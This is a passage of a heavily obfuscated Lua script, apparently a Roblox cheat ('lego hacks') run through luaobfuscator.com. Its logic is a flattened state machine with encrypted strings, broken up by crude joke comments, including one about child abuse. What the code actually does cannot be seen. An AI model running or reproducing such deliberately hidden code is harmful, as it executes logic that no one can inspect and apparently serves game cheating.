not a bitcoin miner real]] else iR=1 T=n[i("\074\188\104\174",25769516457407)]Z=F[T]A=5616299 T=Z(iR)--[[Aztupbrew aka skiddware ðŸ™Œ]]end--[[https://soundcloud.com/shieldenergy]] end--[[im telling my mommy ðŸ˜¤]] else if A<4129420 then if A<4107521 then f=nil V=nil M=nil U=nil b=nil X=nil y=nil y=n[i("\205\030\249\021\001\173\196\206\211\213",23486671672689)]A=true k=nil V=m()C[V]=A f=F[y]y=C[J]o=nil o=23494 U=y(o)A=f~=U A=A and 16486392 or 10216248--[[whats a jmesðŸ¤”]] else iR=n[i("\067\110\252\137\130",16485661326329)]iR=G[iR]iR=iR(G)nR=C[J]zR=23474 sR=23425 NR=23358 uR=23396 LR=nR(zR)zR=C[J]aR=23358 tR=zR(aR)nR=h[tR]tR=23474 iR[LR]=nR nR=n[i("\105\066\072\012\057",10027980924027)]nR=R[nR]nR=nR(R)LR=C[J]zR=LR(tR)tR=C[J]aR=tR(NR)LR=h[aR]nR[zR]=LR tR=C[J]NR=23358 aR=tR(NR)mR=n[i("\073\058\r\042\046\047\246\072\212\024\187\165\152\107\151\163\246\128\040\003\254",19746714765270)]LR=n[i("\194\208\241\205\153\217",31769768883091)]zR=h[aR]NR=n[i("\253\105\065\163\048\098\194\124\206",29034864994720)]aR=F[NR]NR=C[J]pR=23396 CR=NR(sR)tR=aR[CR]sR=C[Q]VR=C[J]PR=VR(uR)mR=sR[mR]JR=T[PR]VR=C[J]uR=23333 PR=VR(uR)VR=23343 KR=JR[PR]mR=mR(sR,KR)sR=100 CR=mR-sR KR=n[i("\228\158\213\178",11989767105438)]LR=r[LR]sR=320 NR=CR/sR mR=F[KR]KR=C[J]JR=KR(VR)sR=mR[JR]JR=23455 mR=C[J]KR=mR(JR)VR=23396 CR=sR[KR]PR=23425 sR=23428 aR=tR(NR,CR)NR=C[J]CR=NR(sR)KR=C[J]JR=KR(VR)mR=T[JR]KR=C[J]VR=23428 JR=KR(VR)sR=mR[JR]JR=n[i("\070\133\117\076\246\016\255",2578132797793)]KR=F[JR]JR=C[J]VR=JR(PR)JR=0 mR=KR[VR]BR=C[J]cR=BR(pR)uR=T[cR]BR=C[J]pR=23346 cR=BR(pR)PR=uR[cR]uR=C[J]cR=23412 BR=uR(cR)VR=PR[BR]PR=0 KR=mR(JR,VR,PR)NR=sR+KR tR={[CR]=NR}LR=LR(r,zR,aR,tR)NR=23454 zR=n[i("\237\060\002\168",5585775432786)]zR=LR[zR]zR=zR(LR)tR=C[J]aR=tR(NR)NR=23358 zR=LR[aR]LR=nil tR=n[i("\139\101\105\185",6739009345668)]tR=zR[tR]mR=23396 tR=tR(zR)tR=C[J]aR=tR(NR)zR=h[aR]tR=C[J]NR=23428 aR=tR(NR)A=3201121 CR=C[J]sR=CR(mR)mR=23428 NR=T[sR]CR=C[J]sR=CR(mR)tR=NR[sR]zR[aR]=tR zR=n[i("\241\029\098\248\160\057\138",10938541778891)]zR=iR[zR]zR=zR(iR)aR=1 iR=nil zR=n[i("\149\022\181\251\120\146\167",19118556628365)]zR=nR[zR]tR=n[i("\108\030\235\117",29678055975927)]zR=zR(nR)zR=F[tR]nR=nil tR=zR(aR)--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]]end--[[Mitochondria is the powerhouse of the cell]] else if A<4182184 then A=14754243--[[Obfuscated with luaobfuscator.com]] else nR=23379 aR=23426 LR=23401 KR=23413 zR=23365 PR=23400 T=C[J]JR=23382 iR=T(nR)BR=23477 T=C[J]VR=23385 eR=n[i("\149\128\162\004",5047814361693)]CR=23345 nR=T(LR)xR=23491 T=C[J]tR=23427 LR=T(zR)T=C[J]zR=T(tR)T=C[J]tR=T(aR)T=15844367 aR=C[J]NR=aR(CR)sR=C[J]mR=sR(KR)sR=C[J]KR=sR(JR)sR=C[J]JR=sR(VR)sR=C[J]VR=sR(PR)CR={[mR]=KR;[JR]=VR}mR=C[J]VR=23354 JR=23413 KR=mR(JR)mR=C[J]PR=23385 JR=mR(VR)mR=C[J]VR=mR(PR)PR=C[J]uR=PR(BR)pR=23505 BR=C[J]cR=BR(pR)PR=Q..cR mR=uR..PR sR={[KR]=JR;[VR]=mR}KR=C[J]VR=23413 JR=KR(VR)PR=23386 KR=C[J]cR=23435 uR=23385 VR=KR(PR)KR=C[J]PR=KR(uR)uR=C[J]BR=uR(cR)pR=F[eR]eR=C[J]lR=eR(xR)cR=pR[lR]pR=C[J]lR=23458 eR=pR(lR)A=15056332 uR=cR..eR KR=BR..uR mR={[JR]=VR,[PR]=KR}PR=23393 JR=23466 aR={CR,sR,mR}mR=23338 CR=C[J]BR=23432 sR=CR(mR)mR=C[J]KR=mR(JR)JR=C[J]VR=JR(PR)PR=C[J]uR=PR(BR)JR=R..uR mR=VR..JR CR={[KR]=mR}Z={[iR]=nR;[LR]=zR,[tR]=T,[NR]=aR,[sR]=CR}iR=n[i("\236\188\085\073\125\022\055\022\125\016\123\v\144\214\137\050",19840133154861)]T=F[iR]iR=T(w,Z)Z=nil--[[what am i doing with my life? making lego hacks]] end--[[whats a jmesðŸ¤”]] end--[[(xA, qt, Sz) ha i broke ur regex]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<4514962 then if A<4344771 then if A<4262179 then U=n[i("\118\187\018\217",2722018593255)]k=23498 y=F[U]U=C[z[1]]o=U(k)f=y[o]o=23473 y=C[z[1]]U=y(o)V=f[U]U=23437 f=C[z[1]]y=f(U)J=V[y]V=C[z[1]]y=23342 f=V(y)A=J[f]f=23419 J=n[i("\209\198\069\077\158\046\094",17774190837929)]J=A[J]J=J(A,x)J=n[i("\023\172\105\078\087\210\053",33057224620098)]A=F[J]J=A()A=C[z[1]]V=A(f)x=nil A=true J[V]=A A=5352611--[[My uncle tickles me]] else T=A zR=n[i("\097\254\136\255",4063163059912)]LR=F[zR]aR=23391 zR=C[J]tR=zR(aR)nR=LR[tR]LR=7449423635 iR=nR==LR Z=iR A=iR and 14223282 or 7464676--[[(xA, qt, Sz) ha i broke ur regex]] end--[[what am i doing with my life? making lego hacks]] else if A<4367625 then N={}A=F[n[i("\168\163\215\255\004\018\t\245\106\062\042\038",26511494701170)]]--[[My uncle tickles me]]else A=T A=Z and 4516490 or 5296289--[[im telling my mommy ðŸ˜¤]] end--[[who the fuck uses mee6]] end--[[who the fuck uses mee6]] else if A<4646682 then if A<4552897 then VR=23385 LR=23404 PR=23344 nR=23379 tR=23427 CR=23345 T=C[J]iR=T(nR)BR=23477 zR=23365 T=C[J]eR=n[i("\137\066\025\135",1154307687475)]aR=23426 pR=23505 nR=T(LR)T=C[J]LR=T(zR)JR=23350 T=C[J]zR=T(tR)T=C[J]tR=T(aR)KR=23413 aR=C[J]xR=23491 T=15844367 NR=aR(CR)sR=C[J]mR=sR(KR)sR=C[J]KR=sR(JR)sR=C[J]JR=sR(VR)sR=C[J]VR=sR(PR)CR={[mR]=KR;[JR]=VR}JR=23413 PR=23385 VR=23354 mR=C[J]KR=mR(JR)mR=C[J]JR=mR(VR)mR=C[J]VR=mR(PR)PR=C[J]uR=PR(BR)BR=C[J]cR=BR(pR)PR=Q..cR mR=uR..PR sR={[KR]=JR;[VR]=mR}KR=C[J]VR=23413 JR=KR(VR)PR=23386 KR=C[J]VR=KR(PR)KR=C[J]uR=23385 PR=KR(uR)cR=23435 uR=C[J]BR=uR(cR)pR=F[eR]eR=C[J]lR=eR(xR)cR=pR[lR]pR=C[J]lR=23458 eR=pR(lR)uR=cR..eR KR=BR..uR mR={[JR]=VR;[PR]=KR}aR={CR,sR,mR}mR=23338 CR=C[J]JR=23466 sR=CR(mR)PR=23393 mR=C[J]KR=mR(JR)JR=C[J]BR=23432 VR=JR(PR)A=5296289 PR=C[J]uR=PR(BR)JR=R..uR mR=VR..JR CR={[KR]=mR}Z={[iR]=nR;[LR]=zR,[tR]=T;[NR]=aR,[sR]=CR}iR=n[i("\159\129\174\046\148\140\228\058\226\243\240\110\108\018\068\072",1481808938340)]T=F[iR]iR=T(g,Z)Z=nil--[[the person who made this script ip grabbed a gorilla]] else NR,CR=tR(aR,NR)A=NR and 10439999 or 722454--[[free source code: dariandev.com/discord]] end--[[Please do not the skid. ]] else X=nil M=nil A=8629511--[[im telling my mommy ðŸ˜¤]] end--[[whats a jmesðŸ¤”]] end--[[what am i doing with my life? making lego hacks]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[devfuscator free no virus 2021]] end--[[who the fuck uses mee6]] else if A<7020571 then if A<5762100 then if A<5450559 then if A<5291813 then if A<5001069 then if A<4981908 then A=nR A=iR and 9471265 or 10070835--[[Override certified boronide fork]] else g=n[i("\156\065\164\057-\132\183\190",24292002617439)]Z=F[g]g=C[J]T=23425 w=g(T)T=23398 nR=23474 R=Z[w]zR=60 g=C[J]w={g(T)}Z=R(q(w))w=n[i("\118\088\088\123\187\145\068\195",19781075552246)]A=3783795 iR=23425 g=F[w]w=C[J]T=w(iR)iR=23352 R=g[T]w=C[J]T={w(iR)}g=R(q(T))R=C[J]T=23474 w=R(T)T=C[J]iR=T(nR)R=G[iR]T=23421 LR=23425 Z[w]=R R=C[J]w=R(T)T=23346 R=true Z[w]=R R=C[J]w=R(T)iR=n[i("\138\012\136\019\143",16226881649416)]T=F[iR]iR=C[J]nR=iR(LR)LR=0 iR=0 R=T[nR]nR=60 T=R(iR,nR,LR,zR)iR=n[i("\173\208\168\242\061\046\108",29133652257276)]Z[w]=T R=C[J]T=23370 w=R(T)T=F[iR]iR=C[J]zR=0 LR=23425 nR=iR(LR)iR=0 R=T[nR]LR=0 nR=2 T=R(iR,nR,LR)Z[w]=T T=23474 R=C[J]w=R(T)R=Z T=23488 g[w]=R R=C[J]iR=n[i("\176\132\050\178\067\133",7581922401173)]w=R(T)LR=23425 T=F[iR]iR=C[J]nR=iR(LR)iR=1 R=T[nR]nR=1 LR=1 T=R(iR,nR,LR)g[w]=T R=C[J]T=23486 w=R(T)LR=23425 R=1 g[w]=R T=23346 iR=n[i("\149\236\159\003\064",1816826611356)]R=C[J]w=R(T)T=F[iR]iR=C[J]nR=iR(LR)R=T[nR]LR=1 iR=1 nR=0 T=R(iR,nR,LR,zR)g[w]=T R=C[J]T=23364 w=R(T)zR=23474 nR=C[J]LR=nR(zR)zR=23474 iR=G[LR]nR=C[J]LR=nR(zR)T=iR[LR]LR=23468 iR=C[J]nR=iR(LR)R=T[nR]g[w]=R R=C[J]T=23356 iR=n[i("\084\038\025\246\168\043",23232187094148)]w=R(T)T=F[iR]iR=C[J]LR=23425 nR=iR(LR)Z=nil iR=1 LR=0 R=T[nR]nR=0 T=R(iR,nR,LR)g[w]=T R=C[J]T=23411 w=R(T)R=true g[w]=R g=nil--[[whats a jmesðŸ¤”]] end--[[whats a jmesðŸ¤”]] else if A<5128853 then CR=23439 tR=n[i("\181\104\177\212",22680266953346)]zR=F[tR]aR=C[J]NR={aR(CR)}tR=n[i("\203\082\208\071\053\049\073\072\116\067",9709069869906)]tR=zR[tR]tR=tR(zR,q(NR))zR=C[J]NR=23397 aR=zR(NR)LR=tR[aR]zR=C[J]aR=23417 A=13545886 tR=zR(aR)nR=LR[tR]LR=C[J]tR=23492 zR=LR(tR)iR=nR==zR Z=iR--[[who the fuck uses mee6]] else S=n[i("\012\131\046\005\190\102\228\215",2946437483192)]A=F[S]H=n[i("\154\033",24315625658485)]v=F[H]S=A(v)A=n[i("\098\111",30546739621664)]F[A]=S A=15073740--[[rubi was here]] end--[[Mitochondria is the powerhouse of the cell]] end--[[free source code: dariandev.com/discord]] else if A<5354984 then if A<5342271 then zR=n[i("\112\024\015\051",19903485855848)]LR=F[zR]zR=C[J]T=A aR=23391 tR=zR(aR)nR=LR[tR]LR=7449423635 iR=nR==LR A=iR and 10544450 or 14289332 Z=iR--[[My uncle tickles me]] else A=16713727--[[Aztupbrew aka skiddware ðŸ™Œ]] end--[[rubi was here]] else if A<5422528 then T=n[i("\143\208\030\163",21413212933606)]nR=23424 R=A w=F[T]T=C[J]iR=T(nR)D=A g=w[iR]iR=23392 w=C[J]T=w(iR)Z=g[T]A=Z and 8484099 or 763927 G=Z--[[free source code: dariandev.com/discord]] else v=true A=1536--[[devfuscator free no virus 2021]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[who the fuck uses mee6]] end--[[devfuscator free no virus 2021]] else if A<5657290 then if A<5537203 then if A<5506910 then A=7565543--[[im telling my mommy ðŸ˜¤]] else A=15309780 D=n[i("\191\144\138\214",3807604706778)]r=F[D]D=r()R=C[z[2]]Z=23389 G=R[M]R=C[z[1]]W=R(Z)r=G[W]Q=D-r r=3600 h=Q>r b=h--[[whats a jmesðŸ¤”]] end--[[what am i doing with my life? making lego hacks]] else if A<5611785 then T=65536 Y=0 v=Y w=65536 g=S/w O=b(g)E=S%T T=256 w=E/T E=256 g=b(w)w=S%E A=6781135 T={U(O,g,w)}O=nil E=y(Z,q(T))g=nil E=0 S=E w=nil--[[who the fuck uses mee6]] else Q=nil D=nil A=11658596 R=nil w=nil r=nil G=nil h=nil g=nil--[[My uncle tickles me]] end--[[https://soundcloud.com/shieldenergy]] end--[[Mitochondria is the powerhouse of the cell]] else if A<5674959 then if A<5664516 then A=k(R,j,j)H=A A=X[H]I=A A=I and 12661635 or 13641121--[[what am i doing with my life? making lego hacks]] else x=x+V y=not f K=x<=J K=y and K y=x>=J y=f and y K=y or K y=16090091 A=K and y K=7604456 A=A or K--[[what am i doing with my life? making lego hacks]] end--[[who the fuck uses mee6]] else if A<5703222 then iR=n[i("\208\197\192\142",4232819445606)]T=F[iR]R=A LR=23424 iR=C[J]nR=iR(LR)w=T[nR]nR=23392 T=C[J]iR=T(nR)g=w[iR]iR=23334 w=C[J]T=w(iR)Z=g[T]G=Z A=Z and 13175186 or 12355449--[[the person who made this script ip grabbed a gorilla]] else U=nil A=7233245 o=nil--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] end--[[what am i doing with my life? making lego hacks]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[Override certified boronide fork]] else if A<6359618 then if A<6158918 then if A<5925971 then if A<5823301 then A=C[z[2]]x=1 N=A()N=n[i("\235\063\001\054",30365271715447)]A=F[N]N=A(x)A=C[z[2]]x=1 N=A()N=n[i("\157\249\077\019",30331984703064)]A=F[N]N=A(x)A=C[z[2]]x=1 N=A()N=n[i("\044\037\097\168",34888010301163)]A=F[N]N=A(x)x=1 A=C[z[2]]N=A()N=n[i("\026\230\080\t",10513327040063)]A=F[N]N=A(x)x=1 A=C[z[2]]N=A()N=n[i("\248~\004\052",19806846142478)]A=F[N]N=A(x)A=C[z[2]]N=A()A=9387807--[[Please do not the skid. ]] else N={}A=F[n[i("\120\164\081\148\203\025\r\002\242\025\127\t-\098",31455152927342)]]--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]]end--[[Override certified boronide fork]] else if A<6032712 then R=nil A=20480 h=nil--[[Evon is not a bitcoin miner real]] else A=u(1080865,{z[1],z[4]})k=n[i("\047\202\238\152",34731239210585)]x=A N=n[i("\095\243~\140\046",20380241775140)]A=F[N]X=23498 o=F[k]k=C[z[1]]M=k(X)U=o[M]o=C[z[1]]M=23473 k=o(M)y=U[k]k=23437 U=C[z[1]]o=U(k)f=y[o]U=n[i("\064\185\123\004\121\171\031\075\219\107\060",10465007183378)]U=f[U]y={U(f)}f={A(q(y))}J=f[2]V=f[3]A=11054930 N=f[1]f=N--[[who the fuck uses mee6]] end--[[Please do not the skid. ]] end--[[mee6 what are you doing to my wife]] else if A<6239237 then if A<6227969 then k=23481 V=x y=C[z[2]]o=23468 U=y(o)A=f[U]U=C[z[2]]y=n[i("\090\030~\043",29282906925703)]y=A[y]o={U(k)}y=y(A,q(o))A=y and 11208534 or 9619238--[[im telling my mommy ðŸ˜¤]] else r=23389 A=C[z[2]]h=C[z[1]]Q=h(r)r=n[i("\a\071\026\177",4902854791638)]h=F[r]r=h()b={[Q]=r}D=23353 A[M]=b A=C[z[3]]b=A()h=n[i("\107\"\r\071",1527981245839)]b=F[h]Q=C[z[1]]h=n[i("\070\004\135\170\218\027\232\118\020\228",23747598898788)]h=b[h]r={Q(D)}h=h(b,q(r))r=23465 b=C[z[1]]Q=b(r)b=n[i("\016\053\143\025\014\245\038\016\170\130\057\122",27789286466840)]A=h[Q]r=23341 h=C[z[1]]Q=h(r)b=A[b]b=b(A,Q,M)A=true N={A}A=F[n[i("\110\238\026\103\064\143~\205\023\167\239\020\049",27995451188696)]]--[[devfuscator free no virus 2021]]end--[[Please do not the skid. ]] else if A<6260809 then v=n[i("\225\177",3215954906035)]A=F[v]v=n[i("\078\021",23569352316350)]F[v]=A A=15073740--[[Aztupbrew aka skiddware ðŸ™Œ]] else tR=n[i("\023\094\101\170",28857692186875)]CR=23439 zR=F[tR]aR=C[J]NR={aR(CR)}tR=n[i("\111\017\"\089\086\234\156\173\216\114",12810130894490)]A=14121391 tR=zR[tR]tR=tR(zR,q(NR))NR=23397 zR=C[J]aR=zR(NR)LR=tR[aR]aR=23417 zR=C[J]tR=zR(aR)nR=LR[tR]LR=C[J]tR=23366 zR=LR(tR)iR=nR==zR Z=iR--[[Obfuscated with luaobfuscator.com]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[https://soundcloud.com/shieldenergy]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] else if A<6890512 then if A<6638792 then if A<6385850 then N=3533932 J=23363 K=C[z[1]]x=K(J)K=5028506 s=x^K A=N-s s=A N=C[z[1]]x=23472 K=N(x)A=K/s N={A}A=F[n[i("\250\214\240\088\195\066\135\095\150\040\112\179",10284613051754)]]--[[devfuscator free no virus 2021]]else A=C[X]v=6 S=1 j=A(S,v)A=n[i("\100\138",24428371990750)]v=n[i("\106\201",29147611326985)]F[A]=j S=F[v]v=2 A=S>v A=A and 5287073 or 6249151--[[Please do not the skid. ]] end--[[rubi was here]] else if A<6716861 then K=1 A={}x=C[z[10]]J=x s=A x=1 V=x A=5665453 x=0 f=V<x x=K-V--[[mee6 what are you doing to my wife]] else A=2268229--[[devfuscator free no virus 2021]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[Evon is not a bitcoin miner real]] else if A<6935720 then if A<6901390 then N=C[z[1]]J=23431 K=C[z[2]]x=K(J)s={a(1,q(L))}J=n[i("\"\158\191\223\100\116\131\114\239\250\177",7254421150308)]A=N[x]J=A[J]J={J(A)}A=1916474 N=J[1]x=J[3]K=J[2]J=N--[[who the fuck uses mee6]] else A=F[n[i("\201\042\t\002\072\155\143\226\159\038\027\200\156",29257136335471)]]N={}--[[Obfuscated with luaobfuscator.com]]end--[[Evon is not a bitcoin miner real]] else nR=23379 T=C[J]aR=23426 zR=23365 LR=23401 pR=23505 iR=T(nR)T=C[J]CR=23345 nR=T(LR)T=C[J]LR=T(zR)VR=23385 T=C[J]tR=23427 JR=23382 zR=T(tR)PR=23443 KR=23413 T=C[J]tR=T(aR)T=10181046 aR=C[J]NR=aR(CR)eR=n[i("\167\076\037\155",31035307061479)]sR=C[J]mR=sR(KR)sR=C[J]KR=sR(JR)sR=C[J]JR=sR(VR)sR=C[J]VR=sR(PR)CR={[mR]=KR,[JR]=VR}PR=23385 JR=23413 mR=C[J]KR=mR(JR)mR=C[J]BR=23477 VR=23354 JR=mR(VR)mR=C[J]VR=mR(PR)PR=C[J]uR=PR(BR)BR=C[J]xR=23491 cR=BR(pR)PR=Q..cR mR=uR..PR sR={[KR]=JR,[VR]=mR}VR=23413 PR=23386 KR=C[J]uR=23385 JR=KR(VR)cR=23435 KR=C[J]VR=KR(PR)KR=C[J]PR=KR(uR)uR=C[J]BR=uR(cR)pR=F[eR]eR=C[J]lR=eR(xR)cR=pR[lR]pR=C[J]lR=23458 eR=pR(lR)uR=cR..eR KR=BR..uR A=15056332 mR={[JR]=VR;[PR]=KR}BR=23432 PR=23393 aR={CR;sR,mR}CR=C[J]JR=23466 mR=23338 sR=CR(mR)mR=C[J]KR=mR(JR)JR=C[J]VR=JR(PR)PR=C[J]uR=PR(BR)JR=R..uR mR=VR..JR CR={[KR]=mR}Z={[iR]=nR;[LR]=zR;[tR]=T;[NR]=aR,[sR]=CR}iR=n[i("\047\105\186\164\170\171\198\166\038\a\119\076\064\195\133\066",29664096906218)]T=F[iR]iR=T(w,Z)Z=nil--[[Evon is not a bitcoin miner real]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[free source code: dariandev.com/discord]] end--[[what am i doing with my life? making lego hacks]] end--[[whats a jmesðŸ¤”]] else if A<8178223 then if A<7554764 then if A<7229470 then if A<7066799 then if A<7049527 then CR=23353 tR=n[i("\249\026\041\072",15682477930765)]zR=F[tR]A=nR aR=C[J]tR=n[i("\059\202\240\053\151\067\014\170\232\178",7367167482573)]tR=zR[tR]NR={aR(CR)}CR=23376 tR=tR(zR,q(NR))KR=23373 zR=C[J]NR=23348 sR=23464 aR=zR(NR)LR=tR[aR]aR=23340 zR=C[J]tR=zR(aR)nR=LR[tR]LR=n[i("\207\172\202\071\147\057\203\146\230\205\198\062",21720312467204)]zR=C[J]aR=23378 tR=zR(aR)JR=23414 zR=n[i("\158\'\054\222\188\186\066\234\139\082\060\238",19564173084460)]aR=C[J]zR=iR[zR]NR={aR(CR)}LR=nR[LR]zR=zR(iR,q(NR))LR=LR(nR,tR,zR,iR)LR=n[i("\175\031\241\118",34289917852862)]zR=.5 tR=n[i("\248\220",12257136979095)]nR=F[LR]LR=nR(zR)LR=n[i("\054\152\201\t\188\056\199\128\135\194\083",29496588069710)]nR=u(7050455,{J})F[LR]=nR nR=u(13403033,{J})LR=n[i("\156\052\172\058\210\167\003\065\239\040\102\248\217\191\193\239",18850112980115)]F[LR]=nR nR=25200 VR=23368 CR=23384 NR=23372 zR=F[tR]tR=C[J]aR=tR(NR)LR=zR[aR]zR=LR()aR=n[i("\127\184",15385042368504)]tR=F[aR]aR=C[J]NR=aR(CR)LR=tR[NR]CR=23457 aR=C[J]NR=aR(CR)aR=zR+nR tR=LR(NR,aR)PR=23407 NR=n[i("\033\067\083\120\062\068",26898053554650)]aR=F[NR]NR=C[J]CR=NR(sR)LR=aR[CR]NR=C[J]sR=23328 CR=NR(sR)sR=C[J]mR=sR(KR)NR=tR[mR]mR=C[J]KR=mR(JR)sR=tR[KR]KR=C[J]JR=KR(VR)mR=tR[JR]aR=LR(CR,NR,sR,mR)CR=n[i("\012\153\041\195\240\217",5205659226864)]NR=F[CR]mR=23464 CR=C[J]sR=CR(mR)LR=NR[sR]mR=23460 CR=C[J]sR=CR(mR)JR=23489 mR=C[J]KR=mR(JR)VR=23325 CR=tR[KR]KR=C[J]JR=KR(VR)mR=tR[JR]JR=C[J]VR=JR(PR)KR=tR[VR]NR=LR(sR,CR,mR,KR)LR=C[J]sR=23503 KR=n[i("\190\037\054\141",738756919984)]CR=LR(sR)mR=F[KR]KR=C[J]VR=23391 JR=KR(VR)sR=mR[JR]mR=7449423635 LR=sR==mR A=LR and 112643 or 14416824--[[My uncle tickles me]] else y=23390 f=23479 b=23470 K=L[2]x={a(3,q(L))}s=L[1]N=n[i("\101\091\137\185",16726186835161)]A=F[N]J=C[z[1]]V={J(f)}N=n[i("\044\206\224\183\171\121\207\183\063\244",33759473203920)]N=A[N]f=23375 N=N(A,q(V))M=23476 J=N X=23456 N=C[z[1]]V=N(f)N=C[z[1]]f=N(y)y=23394 A={[V]=f}N=C[z[1]]f=N(y)V=A A={[f]=K}f=A N=n[i("\a\209\049\243\247\125\014",9217281106312)]A=n[i("\128\127\022\042\046\216\129\099\227\098",24659233528245)]A=J[A]A=A(J,f)y=A A=F[N]f=nil o=C[z[1]]h=23357 Q=23475 J=nil K=nil k=o(M)o=C[z[1]]M=o(X)o=C[z[1]]X=o(b)o=C[z[1]]b=o(h)o=C[z[1]]h=o(Q)U={[k]=s;[M]=X;[b]=V,[h]=y}N=A(U)U=N N=n[i("\074\164\165\086\079",441321357723)]y=nil V=nil s=nil M=23446 A=F[N]o=C[z[1]]k={o(M)}U=nil N=A(q(k))A=F[n[i("\172\250\183\151\138\000\r\080\r\185\068\166",24282338646102)]]N={}--[[https://soundcloud.com/shieldenergy]]end--[[what am i doing with my life? making lego hacks]] else if A<7182154 then nR,LR=T(iR,nR)A=nR and 13970347 or 3861622--[[hey psst you the wrapper function is right there]] else Q=n[i("\255\092\159\223\087",29087479949777)]h=F[Q]Z=n[i("\238\002\019\012",13615461839240)]w=23324 R=F[Z]Z=C[J]g=Z(w)Z=n[i("\"\150\251\140\198\056\059\238\190\090\104\248\087\217",30337353576029)]G=R[g]Z=G[Z]A=11892075 R={Z(G)}G={h(q(R))}D=G[3]Q=G[1]r=G[2]--[[whats a jmesðŸ¤”]]end--[[Mitochondria is the powerhouse of the cell]] end--[[devfuscator free no virus 2021]] else if A<7327995 then if A<7250195 then f,o=y(V,f)A=f and 2218563 or 14574013--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else r=G A=R A=G and 13437850 or 2251844--[[(xA, qt, Sz) ha i broke ur regex]] end--[[https://soundcloud.com/shieldenergy]] else if A<7499874 then A=T A=Z and 10927438 or 602642--[[what am i doing with my life? making lego hacks]] else A=T A=Z and 1326632 or 15056332--[[rubi was here]] end--[[https://soundcloud.com/shieldenergy]] end--[[Please do not the skid. ]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] else if A<7844278 then if A<7573643 then if A<7566332 then A=true A=A and 8791308 or 4360325--[[what am i doing with my life? making lego hacks]] else A=Q A=1153571--[[who the fuck uses mee6]] end--[[hey psst you the wrapper function is right there]] else if A<7680017 then A=C[z[11]]K=C[z[12]]s[A]=K A=C[z[13]]K={A(s)}N={q(K)}A=F[n[i("\125\097\029\159\079\047\143\078\245\069\168\121\020\174",9517937992352)]]--[[Please do not the skid. ]]else k=23353 y=n[i("\219\101\069-",4810510176640)]N=F[y]y=n[i("\053\148\100\202\184\125\063\210\198\058",34659296312854)]f=K U=C[z[1]]o={U(k)}y=N[y]y=y(N,q(o))o=23465 N=C[z[1]]U=N(o)N=n[i("\157\060\169\005\017\077\023\226\134\191\190\104",15434435999782)]A=y[U]N=A[N]N=N(A,f)y=N N=n[i("\218\226\060\106\003",19839059380268)]A=F[N]k={A(y)}N=k[1]o=k[3]U=k[2]A=8629511 k=N--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[hey psst you the wrapper function is right there]] end--[[the person who made this script ip grabbed a gorilla]] else if A<8039025 then if A<7963816 then JR=23355 mR=C[J]sR=n[i("\041\213\061",27603523462251)]A=11833705 KR={mR(JR)}sR=T[sR]sR=sR(T,q(KR))CR=not sR aR=CR--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else M=1 X=2 k=o[M]M=o[X]A=k<M A=A and 12928907 or 5706414--[[My uncle tickles me]] end--[[free source code: dariandev.com/discord]] else if A<8079522 then r=n[i("\143\052\047\175\089\017",23616598398442)]A=2164802 Q=F[r]h=Q--[[mee6 what are you doing to my wife]] else K=C[z[2]]x=C[z[3]]s=K==x A=2308678 N=s--[[what am i doing with my life? making lego hacks]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] end--[[who the fuck uses mee6]] end--[[mee6 what are you doing to my wife]] end--[[hey psst you the wrapper function is right there]] else if A<8654870 then if A<8488984 then if A<8377462 then if A<8328551 then D=n[i("\188\120\050\230\048\231\140",30004483452199)]r=F[D]D=r()r=C[J]R=23330 G=r(R)r=true Q=D[G]h=Q==r A=h and 7211740 or 11658596--[[My uncle tickles me]] else aR=1 C[V]=AR tR=C[T]zR=tR+aR LR=nR[zR]qR=h+LR LR=256 A=qR%LR zR=C[w]h=A LR=D+zR zR=256 qR=LR%zR A=2303558 D=qR--[[devfuscator free no virus 2021]] end--[[Mitochondria is the powerhouse of the cell]] else if A<8426276 then LR=23474 iR=C[J]A=2437706 nR=iR(LR)T=G[nR]iR=C[J]LR=23468 nR=iR(LR)w=T[nR]T=C[J]nR=23396 iR=T(nR)g=w==iR R=g--[[devfuscator free no virus 2021]] else A=R A=G and 5699246 or 14425529 r=G--[[im telling my mommy ðŸ˜¤]] end--[[My uncle tickles me]] end--[[My uncle tickles me]] else if A<8615318 then if A<8586704 then A=M(R)W=A A={}Z=A A=1 j=A A=0 S=A A=0 v=A A=14650303--[[Override certified boronide fork]] else A=Q A=h and 8673033 or 1153571--[[Override certified boronide fork]] end--[[Mitochondria is the powerhouse of the cell]] else if A<8624708 then iR=65536 T=S/iR w={b(T)}g={U(q(w))}O=y(Z,q(g))g=A w=j>=W A=w and 16541689 or 12957068 O=w--[[devfuscator free no virus 2021]] else o,X=k(U,o)A=o and 12306808 or 15899110--[[Override certified boronide fork]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[who the fuck uses mee6]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else if A<8865319 then if A<8768887 then if A<8732960 then Q=n[i("\123\226\089",28850175764724)]h=F[Q]A=h and 6903507 or 9546531--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else iR=LR A=zR A=LR and 7026902 or 3218018--[[rubi was here]] end--[[(xA, qt, Sz) ha i broke ur regex]] else if A<8832381 then s=n[i("\020\243",27196562891504)]N=n[i("\218\111",23912960186110)]A=F[N]N=F[s]s=n[i("\083\217",6116220081728)]F[s]=A A=7565543 s=n[i("\060\182",524002001384)]F[s]=N s=C[z[1]]K=s()--[[(xA, qt, Sz) ha i broke ur regex]]else A=C[z[8]]A=A 